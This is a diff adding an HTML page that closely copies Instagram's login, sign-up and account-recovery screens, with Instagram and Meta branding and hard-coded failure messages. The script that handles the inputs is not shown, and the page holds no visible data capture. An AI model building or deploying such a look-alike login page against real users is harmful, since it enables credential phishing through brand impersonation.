@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Clone Fix</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div id="login-screen" class="screen active">
+            <div class="lang-selector">English (UK) <span>⌄</span></div>
+            <div class="logo-wrapper">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" class="insta-icon-main">
+            </div>
+            <div class="form-box">
+                <input type="text" placeholder="Username, email address or mobile number">
+                <input type="password" placeholder="Password">
+                <button class="primary-btn mt-20" id="login-trigger">
+                    <span class="btn-text">Log in</span>
+                    <div class="loader" id="login-loader"></div>
+                </button>
+            </div>
+            <div id="login-error" class="error-msg red-text">Invalid username or password.</div>
+            <div class="forgot-link" onclick="goTo('forgot-screen')">Forgotten password?</div>
+            <div class="footer">
+                <button class="outline-btn" onclick="openCreateScreen()">Create new account</button>
+                <div class="meta-brand"><img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg"> Meta</div>
+            </div>
+        </div>
+
+        <div id="create-screen" class="screen">
+            <div class="nav-header"><span class="back-icon" onclick="goTo('login-screen')">←</span></div>
+            <h2 class="title">Create a username</h2>
+            <p class="desc">Add a username or use our suggestion. You can change this at any time.</p>
+            <div class="input-wrapper">
+                <input type="text" id="username-input" placeholder="Username">
+                <span class="error-icon" id="err-x" style="display:none;">✖</span>
+            </div>
+            <div id="create-error" class="error-msg red-text" style="text-align:left;">This username is already taken. Please try another.</div>
+            <button class="primary-btn mt-20" id="create-trigger">
+                <span class="btn-text">Next</span>
+                <div class="loader" id="create-loader"></div>
+            </button>
+        </div>
+
+        <div id="forgot-screen" class="screen">
+            <div class="nav-header"><span class="back-icon" onclick="goTo('login-screen')">←</span></div>
+            <h2 class="title">Find your account</h2>
+            <p class="desc">Enter your username or email to find your account.</p>
+            <input type="text" placeholder="Username or email">
+            <button class="primary-btn mt-20" id="forgot-trigger">
+                <span class="btn-text">Find account</span>
+                <div class="loader" id="forgot-loader"></div>
+            </button>
+            <div id="forgot-error" class="error-msg red-text">Something went wrong.</div>
+        </div>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
